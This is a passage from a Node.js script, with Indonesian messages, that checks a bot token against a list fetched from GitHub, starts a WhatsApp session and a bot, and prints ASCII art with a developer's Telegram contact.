    const validTokens = await fetchValidTokens();

    if (!Array.isArray(validTokens)) {
        console.log(chalk.red("Data token tidak valid dari GitHub!"));
        process.exit(1);
    }

    if (!validTokens.includes(BOT_TOKEN)) {
        console.log(chalk.red("Token Tidak Terdaftar Di Database! Silahkan Hubungi @danzyxnxx"));
        process.exit(1);
    }

    console.clear();
    console.log(chalk.bold.white("✅ Token Valid! Menyiapkan Bot...\n"));
}

async function startBot() {
    console.log(chalk.green("✅ Bot Berhasil Dijalanin! - @danzyxnxx"));
}
// --- Jalankan Bot ---
(async () => {
    await validateToken(); 

    console.clear();
    console.log("⟐ Memulai sesi WhatsApp...");
    startSesi();

    console.log("Sukses Connected");
    bot.launch();

    console.clear();
    console.log(chalk.bold.white(`\n
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢛⣛⣛⠛⠛⡛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠉⣠⠶⢛⣋⣿⠿⠷⠒⠾⣿⣦⡈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⣨⣴⠿⢛⣛⣭⡧⢚⣛⢿⣦⡙⢿⣷⡈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⣠⣾⢛⣥⣾⠟⣩⣤⣄⣘⡛⢷⣌⠻⣮⢻⣷⡀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⡄⠀⣴⠟⣡⣾⡟⣱⣿⢩⡿⣿⡿⢻⢊⢻⣧⡙⡜⣿⡄⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⡔⢀⣼⠏⣰⣿⠌⢰⣿⠋⣾⣿⠇⠸⣦⢧⡀⢻⣷⣴⡘⣿⡄⠹⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡷⠁⣾⡏⣰⣿⠟⠀⠠⡅⠠⠥⠀⢠⣧⠙⠈⢷⠀⢻⡿⢡⠘⣧⠀⢿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⢰⡿⢀⣿⡇⠀⠀⠀⠀⢀⠉⢀⣾⣿⣷⡀⠈⠀⠈⣋⠈⠂⠸⠀⡸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⣿⠇⠸⡏⠀⡀⠁⠒⠀⣀⣴⡟⠯⢭⣿⣿⠆⠀⡼⣽⡇⠀⠀⠀⣱⠘⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠛⠀⠀⠀⢰⣿⣥⣶⣸⣿⣿⣦⡆⢀⢈⣙⢀⣦⡇⡟⠁⠀⠀⠀⠏⣰⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⠿⠀⠀⠰⠀⠘⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣷⠟⣡⣿⠏⠉⠀⠀⢘⣠⣠⣾⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣾⣦⠠⡄⠀⠆⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⡀⠀⠁⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠀⠀⠀⠀⢠⣦⡙⢿⣿⣿⣿⠿⢛⡡⡰⢠⡃⢀⠀⠸⢶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⢿⣿⣿⣿⢿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠙⢃⠀⣬⠉⣠⣴⠟⠠⠶⠿⠛⠀⠀⠀⠀⠉⠛⠿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣏⣭⣶⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⣶⡜⢛⣵⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿
⣿⡿⠷⢨⣿⠏⠁⢀⡀⠀⠀⠀⠀⠀⠀⣀⣀⣀⠀⠀⠀⠈⠁⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿
⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠄⠉⠀⢀⠀⠀⡒⠒⠻⠹⣫⣓⡲⣶⡤⣤⣀⠀⠀⠀⠀⠀⢰⢿⣧⣀⢴⣦⡀⠀⢸⣿⣿
⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠈⠘⠃⠁⠀⢄⣀⣀⡒⠒⠁⠂⠀⣼⣿⢟⣠⡟⠀⠀⠀⣿⣿
⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠜⣡⣴⣯⣽⡒⠦⣤⣤⣀⠀⠀⠀⠀⠈⠉⠉⠙⠉⠁⠀⠀⠀⠉⠃⠾⠿⠃⠀⠀⠀⠸⣿
⣿⡀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣦⡈⠉⠛⠛⠛⣛⣓⣶⣶⡒⠢⢤⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿
⣿⡇⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣾⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿
⣿⣿⠀⠀⠀⠀⠀⠀⢸⣿⣀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿
⣿⣿⣷⠀⠀⠀⠀⠀⠘⣿⡿⣿⣿⣿⣿⣿⣿⡿⣿⣿⢸⣿⣿⣿⣿⡇⠀⢸⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻
⣿⣿⣿⣧⡀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⠟⣱⣿⣿⡌⣿⣿⣿⣿⣷⣾⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸
⣿⣿⣿⣿⣿⣦⣄⣀⣀⣠⢵⣤⣉⣉⣩⣴⣾⣿⣿⣿⣷⡈⠻⣿⣿⣿⣿⣾⡿⠛⣰⡇⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⣉⣉⣉⣁⣶⣾⡿⢡⣾⣄⠀⠀⠀⠀⠀⠀⠀⠀⣰
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⢸⣿⣿⣦⡀⠀⠀⠀⠀⠀⣴⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢃⣾⣿⣿⣿⣿⣦⣤⣤⣴⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡿⢋⢀⡎⣰⣜⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⡀⢈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡿⢁⢀⣿⢸⠟⣨⡻⣶⣍⣙⣛⠿⠿⠿⠿⠿⠿⠿⢛⣉⣄⣴⡄⣿⣎⢆⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡿⢡⠁⣸⠇⣾⣼⣿⣿⣶⡭⣙⣻⠿⠿⠿⣿⣿⠿⠿⠟⣋⣅⢿⣷⢸⣿⡄⢄⠻⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⠃⠂⠀⡟⣼⣿⣿⡿⢹⣿⣷⣿⣿⣼⣿⣿⣼⣶⢰⣿⣿⢿⣿⢸⣿⡇⢻⣿⡌⣦⡹⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡟⢀⡼⢸⡇⣿⣿⣿⠇⣿⣿⣿⣿⣧⣿⣿⣿⣿⣯⢸⣿⠻⢸⣿⡇⢿⣿⡜⣿⣷⡈⣷⡘⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⠃⣼⠃⣾⢣⣿⣿⡿⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣧⠘⣿⣷⡘⣿⣧⠹⣿⣷⠘⣧⠘⣿⣿⣿⣿⣿
⣿⣿⣿⡇⢠⣿⡄⣿⢸⣿⣿⠃⣿⣿⢸⣿⣿⢹⣿⣿⣿⣿⣿⢸⣿⣿⡆⢻⣿⡇⢿⣿⣆⢻⣿⡇⠙⣆⠸⣿⣿⣿⣿
⣿⣿⡿⠀⣾⡇⢰⡏⣼⣿⢹⠀⣿⣿⣿⣿⣿⢸⣿⣿⢻⣿⣿⣸⣿⣿⣇⠈⣿⣿⠈⢿⣿⡈⣿⣿⠀⠹⠀⢻⣿⣿⣿
⣿⣿⣷⠀⣀⡀⢸⠁⣿⣿⠸⠐⣿⡇⣿⣿⣿⢸⣿⣿⣼⣿⣿⡇⣿⣿⣿⠀⣿⣿⡇⢸⣿⡇⠙⠟⠃⢠⣴⣿⣿⣿⣿
⣿⣿⣿⣾⣿⡇⠈⠀⠙⢿⠀⢸⣿⡇⣿⣿⣿⢸⣿⣿⢸⣿⣿⡇⢿⣿⣿⠀⢹⣿⣇⠘⠛⠛⠀⠀⠀⣼⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣧⠀⠀⠈⠒⠀⠈⢿⡇⣿⣿⣿⢸⣿⣿⢸⣿⣿⡇⢸⣿⣿⡇⢸⢛⠅⠀⣀⣄⠀⠀⢀⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⢸⣦⡄⣀⠓⠀⠐⠲⠭⠀⡙⢿⠀⢙⠻⡇⠀⠶⠯⡁⠀⠀⣠⣾⣿⣿⠀⠀⣼⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣷⠀⠀⣿⣿⣿⣦⣤⣷⣤⣀⡀⠀⠓⢀⠀⠉⠃⣀⢀⡀⣴⣿⣿⣿⣿⣿⡟⠀⢰⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡄⠀⢻⣿⣿⣿⣿⣿⣿⠿⠾⠀⠀⠸⠷⠶⠸⠿⠹⢿⣿⣿⣿⣿⣿⣿⠇⢀⣾⣿⣿⣿⣿⣿⣿⣿
╭────── Bot Berhasil Connect ──────
│Developer : t.me/salldisinicuy
│Note : terimakasih sudah make bot kami
╰───────────────────────`));
})();